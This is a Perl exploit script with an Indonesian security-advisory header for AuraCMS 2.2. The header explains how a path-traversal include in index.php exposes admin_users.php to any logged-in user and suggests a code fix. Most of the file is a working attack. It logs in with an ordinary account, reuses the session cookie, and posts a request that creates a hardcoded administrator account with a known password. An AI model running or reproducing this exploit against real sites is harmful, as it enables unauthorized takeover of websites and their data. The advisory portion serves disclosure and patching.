#!/usr/bin/perl
#
# Indonesian Newhack Security Advisory
# ------------------------------------
# AuraCMS 2.2 - (admin_users.php) Remote Add Administrator Exploit
# Waktu			:  Dec 25 2007 04:50AM
# Software		:  AuraCMS 2.2
# Vendor		:  http://www.auracms.org/
# Ditemukan oleh	:  k1tk4t  |  http://newhack.org
# Lokasi		:  Indonesia
# Penjelasan		:
# 
# Kutu pada berkas "admin_users.php"
# coba kita lihat ;
# 01. <?
# 02. if(ereg(basename (__FILE__), $_SERVER['PHP_SELF']))
# 03. {
# 04. 	header("HTTP/1.1 404 Not Found");
# 05.	exit;
# 06. }
# ---//---
# 12. if (!cek_login()){
# 13.    header("location: index.php");
# 14.   exit;
# 15. } else{
# ---//----
# Ada yang menarik pada berkas "admin_users.php", pada baris 02 - 06 
sebenarnya berkas ini sudah cukup aman
# karena jika berkas ini dipanggil langsung dari browser 
[http://target.com/admin/admin_users.php] akan menjawab Not Found dan 
Keluar
# mmm....!!! coba perhatikan baris 12 - 15, jika "cek_login()" maka akan 
meneruskan ke perintah2 berikutnya. 
# Disinilah kita mencoba 'bermain'  ;) 
# fungsi "cek_login()" ini hanya mengecek status login melalui session 
cookie, dengan semua level login [user,editor,administrator]
# Sehingga "admin_users.php" dapat di akses oleh user dengan level apa 
saja[tidak untuk TAMU],
#
# => Lantas Bagaimana Mengaksesnya, bukankah berkas "admin_users.php" 
tidak bisa dipanggil langsung [Baris 02 - 06] ?
# yup benar  ;)  "admin_users.php" tidak bisa di panggil langsung 
melalui browser, sekarang coba kita lihat pada berkas "index.php" ;
# ---//---
# 71. if(!isset($_GET['pilih'])){
# 72. include 'content/normal.php';
# 73. }else if (@$_GET['mod'] == 'yes' && 
file_exists('mod/'.@$_GET['pilih'].'/'.@$_GET['pilih'].'.php') && 
!isset($_GET['act']) && !preg_match("/\.\./",$_GET['pilih'])) {
# 74. include 'mod/'.$_GET['pilih'].'/'.$_GET['pilih'].'.php';
# 75. }else if (@$_GET['mod'] == 'yes' && 
file_exists('mod/'.@$_GET['pilih'].'/'.@$_GET['act'].'.php') && 
!preg_match("/\.\./",$_GET['pilih'])) {
# 76. include 'mod/'.@$_GET['pilih'].'/'.@$_GET['act'].'.php';
# 77. }else if(!isset($_GET['mod']) && !isset($_GET['act']) && 
file_exists('content/'.$_GET['pilih'].'.php') && 
!preg_match("/\.\./",$_GET['pilih'])) {
# 78. include 'content/'.$_GET['pilih'].'.php';	
# 79. }else {
# 80. header("location: index.php");
# 81. exit;	
# 82. } 
# ---//---
# mm... perhatikan kode2 tersebut... menarik bukan?
# iya dengan berkas "index.php" inilah kita bisa mengakses 
"admin_users.php" atau dengan kata lain mematahkan baris 02 - 06 pada 
berkas "admin_users.php",
# 
# => Ooo Gitu..., terus memperbaikinya gmana ?
# hehehe...
# coba ganti baris 02 - 06 pada berkas "admin_users.php" dengan ;
# ---//---
# 02. if (!defined('AURACMS_admin')) {
# 03.	Header("Location: ../index.php");
# 04.	exit;
# 04. }
# ---//--
# Sebenarnya code tersebut sudah ada pada berkas2 admin lainnya, 
terkecuali pada berkas ;
# "admin_users.php"
# "admin_poll.php"
# "admin_kalender.php"
#
# => Ada apa lagi ?
# Exploit ini dibuat untuk pengetesan belaka, bukan untuk kegiatan 
terlarang
# saya[k1tk4t] dan "Indonesian Newhack Technology" tidak bertanggung 
jawab akan kerusakan yang diakibatkan dari penyalahgunaan exploit pada 
site     
#
# =>
# Terima Kasih untuk;
# -[opt1lc, fl3xu5, ghoz]-
# str0ke, DNX, xoron, cyb3rh3b, K-159, the_hydra, y3dips
# nyubi,iFX,sin~X,k1n9k0ng,bius,selikoer,aldy_BT
# Komunitas Security dan Hacker Indonesia
#
# 
----------------------------[Mulai]------------------------------------
use IO::Socket;

if(!$ARGV[4])
{
 print "\n  |--------------------------------------------------------|";
 print "\n  |             Indonesian Newhack Technology              |";
 print "\n  |--------------------------------------------------------|";
 print "\n  |AuraCMS 2.2 - (admin_users.php) Remote Add Admin Exploit|";
 print "\n  |                   Coded by k1tk4t                      |";
 print "\n  |--------------------------------------------------------|";
 print "\n[!] ";
 print "\n[!] Buat Account terlebih dahulu pada site target dan pastikan 
Account tesebut bisa digunakan";
 print "\n[!] Username dan Password tadi akan digunakan untuk membuat 
Account admin dengan exploit ini";
 print "\n[!] Penggunaan : perl auracms22.pl [Site] [Path] [Port] 
[Username] [Password] ";
 print "\n[!] Contoh     : perl auracms22.pl target.com /auracms2.2/ 80 
bugtest 123456";
 print "\n[!] ";
 print "\n";
 exit;
}

$oriserver = $ARGV[0];
$orihost   = "http://".$oriserver;
$oridir    = $ARGV[1];
$oriport   = $ARGV[2];
$oriuser   = $ARGV[3];
$oripass   = $ARGV[4];

  #Sending data...
  print "- Melakukan Koneksi $orihost$oridir\r\n\r\n";
  logindulu();

sub logindulu ()
{
  $ldberkas  = "index.php";
  $ldlengkap  = $oridir.$ldberkas;
  $lddata = "username=".$oriuser;
  $lddata.= "&password=".$oripass;
  $lddata.= "&loguser=1";
  $lddata.= "&submit_login=Login";
  $lddatajml = length($lddata);
  $ldkonek =  IO::Socket::INET->new(Proto => "tcp", PeerAddr => 
"$oriserver", PeerPort => "$oriport") || die "- Connection 
failed...\r\n";
  print $ldkonek "POST $ldlengkap HTTP/1.1\n";
  print $ldkonek "Accept: */*\r\n";
  print $ldkonek "Referer: $orihost\r\n";
  print $ldkonek "Accept-Language: en-us,en;q=0.5\r\n";
  print $ldkonek "Content-Type: application/x-www-form-urlencoded\r\n";
  print $ldkonek "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; 
en-US; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11\r\n";
  print $ldkonek "Host: $oriserver\r\n";
  print $ldkonek "Content-length: $lddatajml\r\n";
  print $ldkonek "Connection: Keep-Alive\r\n";
  print $ldkonek "Cache-Control: no-cache\r\n\r\n";
  print $ldkonek $lddata;
  print $ldkonek "\r\n\r\n";
  while ($hasil = <$ldkonek>) {
    if ($hasil =~ /Set-Cookie: (.*?) path=\//) { $ldkonekcookie = 
$ldkonekcookie.$1; }
    if ($hasil =~ /<b>$oriuser<\/b>/) { buatadmin(); }
   }
   die "- Gagal Login\r\n";
}
sub buatadmin ()
{
  close ($ldkonek);
  print "- Membuat User t4mugel4p dengan level Administrator\r\n\r\n";
  $baberkas  = 
"index.php?pilih=news&act=../../admin/admin_users&mod=yes&aksi=add";
  $balengkap  = $oridir.$baberkas;
  $badata = "user=t4mugel4p";
  $badata.= "&password=t4mugel4p";
  $badata.= "&email=t4mugel4p%40gelapbanget.gitu";
  $badata.= "&level=Administrator";
  $badata.= "&tipe=aktif";
  $badata.= "&add_users=Add";
  $badatajml = length($badata);
  $bakonek =  IO::Socket::INET->new(Proto => "tcp", PeerAddr => 
"$oriserver", PeerPort => "$oriport") || die "- Connection 
failed...\r\n";
  print $bakonek "POST $balengkap HTTP/1.1\r\n";
  print $bakonek "Accept: */*\r\n";
  print $bakonek "Referer: $orihost.$balengkap\r\n";
  print $bakonek "Accept-Language: en-us,en;q=0.5\r\n";
  print $bakonek "Content-Type: application/x-www-form-urlencoded\r\n";
  print $bakonek "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; 
en-US; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11\r\n";
  print $bakonek "Cookie: $ldkonekcookie\r\n";
  print $bakonek "Host: $oriserver\r\n";
  print $bakonek "Content-length: $badatajml\r\n";
  print $bakonek "Connection: Keep-Alive\r\n";
  print $bakonek "Cache-Control: no-cache\r\n\r\n";
  print $bakonek $badata;
  print $bakonek "\r\n\r\n";
  while ($hasil = <$bakonek>) {
    if ($hasil =~ /Data Berhasil Di add/) {
      print "- Exploiting Selesai dan SUKSES !!!\r\n\r\n";
      print "- Login admin menggunakan\r\n" ;
      print "- Username : t4mugel4p\r\n"; 
      print "- Password : t4mugel4p\r\n\r\n";
      print "- Pada site $orihost$ldlengkap\r\n";
      exit();
    }
    if ($hasil =~ /(Data Berhasil Di add)/) {
      print "- Exploit Gagal\r\n";
      exit();
    }
  }
  die "- Exploit Gagal\r\n";
}

